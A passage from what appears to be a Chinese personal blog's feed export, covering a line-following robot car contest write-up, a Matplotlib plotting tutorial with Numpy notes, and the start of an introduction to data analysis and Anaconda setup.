<p>其实今年的题目就是去年和前年控制题目的结合版，识别路口-&gt;判断转向-&gt;蓝牙通信-&gt;循迹-&gt;附加功能。这种类型的题目方案很多，因为是黑线，可以红外传感，也可以摄像头，小车跟随可以光电传感，也可以超声波测距，甚至直接写在蓝牙里面也可以。TI MCU我们不是很熟，故尽量将算法写在摄像头了。</p>
<h2 style="text-align:center;font-weight:700;color:#000">循迹算法</h2>
<ol>
<li>
<p>基本的巡线：采用星瞳科技的官方例程</p>
</li>
<li>
<p>起点路线的判断：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Basic_speeds -> 0.3m/s -> 0.5m/s -> 0.6m/s -> 0.7m/s -> 0.9m/s -> 1.0m/s</span>
self<span class="token punctuation">.</span>basic_speed_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">]</span>

<span class="token comment"># Question Speed and Route lists</span>
self<span class="token punctuation">.</span>ques_speed_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">]</span>
self<span class="token punctuation">.</span>ques_route_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre>
</li>
</ol>
<p>这次将所有的配置参数提取到setting.py中构造Setting类来提高封装度，也便于修改参数，ques_route_list即是小车所要行驶的路线通过遍历这个二维列表即可以知道小车的路线，那么，关键就在于转弯路口的判断<br>
3. 转弯路口的判断：</p>
<p>特征点匹配：虽然和题目要求及其相似，但是我们也还没有尝试过，故暂不做考虑。</p>
<p>模板匹配：拍模板，识别出来会有反馈，因为采用模板匹配这个功能需要sensor采用灰度测试，而基本的线路拟合又是RGB565，如果二者交叉测试的话，又担心MCU处理不过来，故也没有考虑模板匹配</p>
<p><img src="https://s2.loli.net/2022/08/04/fyCvDsmzwSl1EuR.png" alt=""></p>
<p><img src="https://s2.loli.net/2022/08/04/fy2Jg1SAZPCatGi.png" alt="当时拍的两张照片"></p>
<p>直线检测：遇到0°线段宽度大于设定值时则判断起停线，或者90°线段有检测到时判断起停线。我们组采用的是这种方法，因为看起来逻辑可行，有算法支撑，也不涉及到example的存储。但是参数整定真的好难！<span class="emoji" alias="cry" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span>我们一直调到比赛结束也没有调的很好。</p>
<h2 style="text-align:center;font-weight:700;color:#000">细节实现</h2>
<ol>
<li>小车路线的确定：题目中要求跟随小车的行驶<strong>完全</strong>由领头小车指挥控制，<strong>领头小车</strong>上有<strong>启动按键</strong>和<strong>设置按键</strong>，而<strong>跟随小车</strong>只有一个<strong>上电开关</strong>，不得有其他启动和操作按键。每一次行驶发车时，领头小车和跟随小车按照题目要求摆放在行驶路径的指定位置，跟随小车上电，处于等待接收领头小车指令的状态。领头小车一键启动行驶，直到整个行驶过程结束。故采用MSP430上的按键GPIO输出到OpenMV的固定端口上，再和Setting中设定的任务路线相匹配即可知道路线。</li>
<li>PID调节：这部分<a href="https://book.openmv.cc/project/follow-lines.html" style="font-weight:700;color:#B399FF">星瞳科技快速上手部分</a>有提供源码，这里不进行过多解释</li>
<li>蜂鸣器：普通GPIO即可</li>
<li>蓝牙：串口通信，传输的数字对应相应的任务（0-3），4代表停车信号。</li>
<li>转弯方式：这里其实考虑了好多方法，包括定点sleep、开环转弯、设定ROI区域、调节PID…实际采用的是重新设定ROI区域，但效果不是很理想，包括后面并道的时候会有误差，而且实际的PID参数的整定还和车的长度、宽度等因素有关，不恰当的PID、ROI等参数会导致车轮打滑。</li>
</ol>
<h2 style="text-align:center;font-weight:700;color:#000">反思总结</h2>
<ol>
<li>这次硬件和赛道很快到位，主要卡在了MCU的选择以及蓝牙通信上</li>
<li>PID参数整定出现严重问题、调参方式没有结合实际车的长宽等硬件信息，过于理想化。</li>
<li>启停线识别方案选择错误，最后也没有时间修改</li>
<li>软件封装有些晚，应尽早确定方案后进行封装，将参数接口暴露。</li>
</ol>
]]></content>
      <categories>
        <category>竞赛</category>
      </categories>
      <tags>
        <tag>NUEDC</tag>
      </tags>
  </entry>
  <entry>
    <title>数据分析Demo</title>
    <url>/python/some-demo/</url>
    <content><![CDATA[<p>由于平时经常有利用Excel、txt等大量数据绘图等需求、当想要去扒代码时又不记得怎么写了…还得翻以前做的CV过来、故这里做一份Python常见的库函数开发，方便自己查找，也算是一份学习记录总结啦。</p>
<h2 id="Python常见库开发">Python常见库开发</h2>
<h3 id="Matplotlib">Matplotlib</h3>
<p><strong>可视化视图都有哪些？</strong></p>
<p>按照数据之间的关系，我们可以把可视化视图划分为4类，它们分别是比较、联系、构成和分布。我来简单介绍下这四种关系的特点：</p>
<ol>
<li>比较：比较数据间各类别的关系，或者是它们随着时间的变化趋势，比如折线图；</li>
<li>联系：查看两个或两个以上变量之间的关系，比如散点图；</li>
<li>构成：每个部分占整体的百分比，或者是随着时间的百分比变化，比如饼图；</li>
<li>分布：关注单个变量，或者多个变量的分布情况，比如直方图。</li>
</ol>
<p>同样，按照变量的个数，我们可以把可视化视图划分为单变量分析和多变量分析。</p>
<p>单变量分析指的是一次只关注一个变量。比如我们只关注“身高”这个变量，来看身高的取值分布，而暂时忽略其他变量。</p>
<p>多变量分析可以让你在一张图上可以查看两个以上变量的关系。比如“身高”和“年龄”，你可以理解是同一个人的两个参数，这样在同一张图中可以看到每个人的“身高”和“年龄”的取值，从而分析出来这两个变量之间是否存在某种联系。</p>
<p>可视化的视图可以说是分门别类，多种多样，今天我主要介绍常用的10种视图，这些视图包括了散点图、折线图、直方图、条形图、箱线图、饼图、热力图、蜘蛛图、二元变量分布和成对关系。</p>
<p><img src="https://s2.loli.net/2022/07/09/QhFDqmrjysfkAgi.png" alt=""></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt

<span class="token comment"># 0.准备数据</span>
x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span>
y_shanghai <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span>

<span class="token comment"># 1.创建画布</span>
<span class="token comment"># figsize:指定图的长宽</span>
<span class="token comment"># dpi:图像的清晰度</span>
<span class="token comment"># 返回fig对象</span>
plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dpi<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span>

<span class="token comment"># 2.绘制图像</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y_shanghai<span class="token punctuation">)</span>

<span class="token comment"># 3.图像显示</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>添加自定义x,y刻度</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 增加以下两行代码</span>

<span class="token comment"># 2.1 添加x,y轴刻度</span>
<span class="token comment"># 设置x,y轴刻度</span>
x_ticks_label <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"11点&#123;&#125;分"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>
y_ticks <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>

<span class="token comment"># 修改x,y轴坐标刻度显示</span>
<span class="token comment"># plt.xticks(x_ticks_label[::5]) # 坐标刻度不可以直接通过字符串进行修改</span>
plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x_ticks_label<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span>y_ticks<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
<p>添加网格显示</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 2.2 添加网格显示</span>
plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">"--"</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>
<p>添加x轴、y轴描述信息及标题</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 2.3 添加描述信息</span>
plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">"时间"</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">"温度"</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"中午11点-12点某城市温度变化图"</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span></code></pre>
<p>绘制多个图像</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 增加北京的温度数据</span>
y_beijing <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>

<span class="token comment"># 2.绘制图像</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y_shanghai<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"上海"</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y_beijing<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">"--"</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"北京"</span><span class="token punctuation">)</span>  <span class="token comment"># 新增绘制北京的数据</span></code></pre>
<p>显示图例</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 绘制折线图</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y_shanghai<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"上海"</span><span class="token punctuation">)</span>
<span class="token comment"># 使用多次plot可以画多个折线</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y_beijing<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"北京"</span><span class="token punctuation">)</span>

<span class="token comment"># 显示图例</span>
plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"best"</span><span class="token punctuation">)</span></code></pre>
<p>多个坐标系显示</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 0.准备数据</span>
x <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span>
y_shanghai <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>
y_beijing <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>

<span class="token comment"># 1.创建画布</span>
<span class="token comment"># plt.figure(figsize=(20, 8), dpi=100)</span>
fig<span class="token punctuation">,</span> axes <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>nrows<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> ncols<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dpi<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span>

<span class="token comment"># 2.绘制图像</span>
<span class="token comment"># plt.plot(x, y_shanghai, label="上海")</span>
<span class="token comment"># plt.plot(x, y_beijing, color="r", linestyle="--", label="北京")</span>
axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y_shanghai<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"上海"</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y_beijing<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">"--"</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"北京"</span><span class="token punctuation">)</span>

<span class="token comment"># 2.1 添加x,y轴刻度</span>
<span class="token comment"># 构造x,y轴刻度标签</span>
x_ticks_label <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"11点&#123;&#125;分"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>
y_ticks <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>

<span class="token comment"># 刻度显示</span>
<span class="token comment"># plt.xticks(x[::5], x_ticks_label[::5])</span>
<span class="token comment"># plt.yticks(y_ticks[::5])</span>
axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xticks<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_yticks<span class="token punctuation">(</span>y_ticks<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xticklabels<span class="token punctuation">(</span>x_ticks_label<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xticks<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_yticks<span class="token punctuation">(</span>y_ticks<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xticklabels<span class="token punctuation">(</span>x_ticks_label<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># 2.2 添加网格显示</span>
<span class="token comment"># plt.grid(True, linestyle="--", alpha=0.5)</span>
axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">"--"</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">"--"</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>

<span class="token comment"># 2.3 添加描述信息</span>
<span class="token comment"># plt.xlabel("时间")</span>
<span class="token comment"># plt.ylabel("温度")</span>
<span class="token comment"># plt.title("中午11点--12点某城市温度变化图", fontsize=20)</span>
axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"时间"</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"温度"</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"中午11点--12点某城市温度变化图"</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"时间"</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"温度"</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"中午11点--12点某城市温度变化图"</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>

<span class="token comment"># # 2.4 图像保存</span>
plt<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span><span class="token string">"./test.png"</span><span class="token punctuation">)</span>

<span class="token comment"># # 2.5 添加图例</span>
<span class="token comment"># plt.legend(loc=0)</span>
axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># 3.图像显示</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h4 id="小结">小结</h4>
<ul>
<li>添加x,y轴刻度【知道】
<ul>
<li>plt.xticks()</li>
<li>plt.yticks()</li>
<li><strong>注意:在传递进去的第一个参数必须是数字,不能是字符串,如果是字符串吗,需要进行替换操作</strong></li>
</ul>
</li>
<li>添加网格显示【知道】
<ul>
<li>plt.grid(linestyle=“–”, alpha=0.5)</li>
</ul>
</li>
<li>添加描述信息【知道】
<ul>
<li>plt.xlabel()</li>
<li>plt.ylabel()</li>
<li>plt.title()</li>
</ul>
</li>
<li>图像保存【知道】
<ul>
<li>plt.savefig(“路径”)</li>
</ul>
</li>
<li>多次plot【了解】
<ul>
<li>直接进行添加就OK</li>
</ul>
</li>
<li>显示图例【知道】
<ul>
<li>plt.legend(loc=“best”)</li>
<li><strong>注意:一定要在plt.plot()里面设置一个label,如果不设置,没法显示</strong></li>
</ul>
</li>
<li>多个坐标系显示【了解】
<ul>
<li>plt.subplots(nrows=, ncols=)</li>
</ul>
</li>
<li>折线图的应用【知道】
<ul>
<li>1.应用于观察数据的变化</li>
<li>2.可是画出一些数学函数图像</li>
</ul>
</li>
</ul>
<h4 id="附录：中文显示问题解决">附录：中文显示问题解决</h4>
<p><strong>解决方案二：</strong></p>
<p>在Python脚本中动态设置matplotlibrc,这样也可以避免由于更改配置文件而造成的麻烦，具体代码如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token comment"># 设置显示中文字体</span>
plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span> <span class="token comment"># 指定默认字体</span></code></pre>
<p>有时候，字体更改后，会导致坐标轴中的部分字符无法正常显示，此时需要更改axes.unicode_minus参数：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 设置正常显示符号</span>
plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span> </code></pre>
<h3 id="Numpy">Numpy</h3>
<p><code>NumPy</code>是一个功能强大的<code>Python</code>库，主要用于对多维数组执行计算。<code>NumPy</code>这个词来源于两个单词-- <code>Numerical</code>和<code>Python</code>。<code>NumPy</code>提供了大量的库函数和操作，可以帮助程序员轻松地进行数值计算。在数据分析和机器学习领域被广泛使用。他有以下几个特点：</p>
<ol>
<li>Numpy内置了并行运算功能，当系统有多个核心时，做某种计算时，numpy会自动做并行计算。</li>
<li>Numpy底层使用C语言编写，内部解除了GIL（全局解释器锁），其对数组的操作速度不受Python解释器的限制，效率远高于纯Python代码。</li>
<li>实用的线性代数、傅里叶变换和随机数生成函数。</li>
</ol>
<p>总而言之，Numpy一个非常高效的用于处理数值型运算的包。</p>
<hr>
<h3 id="坑位">坑位</h3>
<ul>
<li>pandas</li>
<li>Pyecharts</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Matplotlib</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title>数据分析的基础知识以及环境搭建（附Jupyter快捷键）</title>
    <url>/python/data-base/</url>
    <content><![CDATA[<h1>01 数据分析基础</h1>
<h2 id="一、数据分析介绍">一、数据分析介绍</h2>
<p>当我们谈论数据分析的时候，都在讲些什么呢？</p>
<p>这里我可以把数据分析分成三个重要的组成部分。</p>
<ol>
<li><strong>数据采集</strong>。它是数据分析的原材料，也是最“<strong>接地气</strong>”的部分，因为任何分析都要有数据源。</li>
<li><strong>数据分析</strong>。就是针对现有的数据，进行专业的技术进行分析，并得到一份分析报告。</li>
<li><strong>数据可视化</strong>。它可以说是数据领域中万金油的技能，可以让我们直观地了解到数据分析的结果。</li>
<li><strong>数据挖掘</strong>。它最核心的部分，也是整个商业价值所在。之所以要进行数据分析，就是要找到其中的规律，来指导我们的业务，或者是给领导做出决策提供参考信息。因此<strong>数据挖掘的核心是挖掘数据的商业价值，也就是我们所谈的商业智能BI</strong>。</li>
</ol>
<p><img src="https://s2.loli.net/2022/07/09/dZxJCaSLPKQs9U7.png" alt=""></p>
<h3 id="1、1-生活中的数据分析">1、1 生活中的数据分析</h3>
<h4 id="1、1、1-无处不在的数据">1、1、1 无处不在的数据</h4>
<blockquote>
<p>生活中存在各式各样的数据，那么基于这些数据，我们又能做哪些分析呢？</p>
</blockquote>
<p>最近几年大数据这个词是火的不行，确实随着社会科技水平的提高，我们使用电子设备的时间越来越长，现在数据的增长量真的非常非常快，这些数据来自各个领域，比如：</p>
<ul>
<li>社交：微信，微博，知乎，豆瓣什么的</li>
<li>交通：出租车，公交车等类的数据，比如：滴滴出行</li>
<li>金融：股票历史交易信息，公司财报，新闻媒体的态度等等</li>
<li>医疗：在数据收集和存储上还有很长的路要走</li>
</ul>
<p><strong>典型的数据分析应用</strong>：</p>
<ul>
<li>竞选预测：特朗普和拜登</li>
<li>拥堵预测：交通出行，地图导航</li>
<li>信誉评估：信用额度贷款等</li>
<li>辅助诊断：医疗影像等方面，比如 ：CT图像中的肿瘤</li>
</ul>
<h4 id="1、1、2-数据分析的作用">1、1、2 数据分析的作用</h4>
<p><strong>数据分析是指用适当的统计分析方法对收集来的大量数据进行分析，提取有用信息和形成结论而对数据加以详细研究和概括总结的过程。</strong></p>
<p>数据分析的目的有多种，概括起来有三种：</p>
<ul>
<li>现状分析:告诉你过去发生了什么。    		 探索型数据分析</li>
<li>原因分析:告诉你某一现状为什么发生。      验证型数据分析</li>
<li>预测分析:预测未来会发生什么。                 预测型数据分析</li>
</ul>
<h4 id="1、1、3-为什么需要数据分析能力？">1、1、3 为什么需要数据分析能力？</h4>
<p>举例：</p>
<ol>
<li>通过数据分析，我们可以更好地了解用户画像，为企业做留存率、流失率等指标分析，进而精细化产品运营。</li>
<li>面对生活中遇到的种种麻烦，数据分析也可以提供解决方案，比如信用卡反欺诈，自动屏蔽垃圾邮件等。</li>
<li>如果你关注比特币，数据分析可以帮助你预测比特币的走势。</li>
</ol>
<p><strong>案例分析</strong></p>
<p>故事内容这个故事发生于20世纪90年代的美国超市中，超市管理人员分析销售数据时发现了一个令人难于理解的现象：在某些特定的情况下，“啤酒”与“尿布”两件看上去毫无关系的商品会经常出现在同一个购物篮中，这种独特的销售现象引起了管理人员的注意，经过后续调查发现，这种现象出现在年轻的父亲身上。</p>
<p>故事起因在美国有婴儿的家庭中，一般是母亲在家中照看婴儿，年轻的父亲前去超市购买尿布。父亲在购买尿布的同时，往往会顺便为自己购买啤酒，这样就会出现啤酒与尿布这两件看上去不相干的商品经常会出现在同一个购物篮的现象。</p>
<p>如果这个年轻的父亲在卖场只能买到两件商品之一，则他很有可能会放弃购物而到另一家商店，直到可以一次同时买到啤酒与尿布为止。</p>
<p>超市发现了这一独特的现象，开始在卖场尝试将啤酒与尿布摆放在相同的区域，让年轻的父亲可以同时找到这两件商品，并很快地完成购物。</p>
<p>故事小结这个故事是因为有数据分析的结果支持才会获得成功并得到广泛传播，通过分析购物篮中的商品集合数据，找出商品之间的关联关系，发现客户的购买行为，从而获得更多的商品销售收入</p>
<blockquote>
<p>经典数据挖掘案例：<a href="https://www.sohu.com/a/243626833_99923499">https://www.sohu.com/a/243626833_99923499</a></p>
</blockquote>
<h2 id="二、环境搭建">二、环境搭建</h2>
<h3 id="2、1-Anaconda：">2、1 Anaconda：</h3>
<p><code>Anaconda（水蟒）</code>是一个捆绑了<code>Python</code>、<code>conda</code>、其他相关依赖包的一个软件。包含了180多个科学计算包及其依赖。<code>Anaconda3</code>是集成了<code>Python3</code>的环境，<code>Anaconda2</code>是集成了<code>Python2</code>的环境。<code>Anaconda</code>默认集成的包，是属于内置的<code>Python</code>的包。并且支持绝大部分操作系统（比如：Windows、Mac、Linux等）。下载地址如下：<code>https://www.anaconda.com/distribution/</code>（如果官网下载太慢，可以在清华大学开源软件站中下载：<code>https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/</code>）。根据自己的操作系统，下载相应的版本，因为<code>Anaconda</code>内置了许多的包，所以安装过程需要耗费相当长的时间，大家在安装的时候需要耐心等待。在安装完成后，会有以下几个模块：<code>Anaconda prompt</code>、<code>Anaconda Navigator</code>、<code>Spyder</code>、<code>jupyter notebook</code>，以下分别做一些介绍。</p>
<h4 id="2、1、1-Anaconda-prompt：">2、1、1 Anaconda prompt：</h4>
